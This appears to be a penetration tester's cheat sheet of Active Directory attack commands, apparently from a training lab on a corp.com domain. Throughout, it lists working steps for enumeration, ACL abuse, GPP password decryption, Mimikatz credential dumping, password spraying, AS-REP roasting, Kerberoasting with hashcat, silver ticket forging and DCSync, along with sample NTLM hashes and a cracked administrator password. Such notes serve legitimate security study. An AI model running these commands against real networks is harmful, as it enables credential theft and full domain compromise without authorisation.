### Enumertaion 
```
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
Get-NetGroup | select cn
Get-NetUser | select cn,pwdlastset,lastlogon
```

```
Find-LocalAdminAccess
Get-NetSession -ComputerName web04 -Verbose

Get-NetSession -ComputerName client74

Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion

.\PsLoggedon.exe \\files04
```

### SPN
```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

### Enumerating Object Permissions
```
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```

```
Get-ObjectAcl -Identity <user>
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName

#exploit
net group "Management Department" <user> /add /domain
```
### Domain Shares
```
Find-DomainShare
ls \\dc1.corp.com\sysvol\corp.com\
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml     # Password cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

### Mimikatz
```
privilege::debug
sekurlsa::logonpasswords

## Access the SMB
dir \\web04.corp.com\backup
sekurlsa::tickets                         # Group 0 - Ticket Granting Service and Group 2 - Ticket Granting Ticket
```

### Password Spraying from Windows 
```
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
### AS-REP Roasting
```
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
hashcat --help | grep -i "Kerberos"
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# From winows
.\Rubeus.exe asreproast /nowrap
sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
### Kerberoasting
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
cat hashes.kerberoast
hashcat --help | grep -i "Kerberos"
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

## Linux 
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Silver Ticket 
```
Access any web or smbshare
iwr -UseDefaultCredentials http://web04

##Mimikatz
privilege::debug
sekurlsa::logonpasswords                 # found iis service hash NTLM     : 4d28cf5252d39971419580a51484ca09
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
klist
iwr -UseDefaultCredentials http://web04   # it will work
```
### Domain Controller Synchronization (DCsync attack)
```
.\mimikatz.exe
lsadump::dcsync /user:corp\dave         #   Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
lsadump::dcsync /user:corp\Administrator  # Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
Cracked Administrator hash found BrouhahaTungPerorateBroom2023!
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```
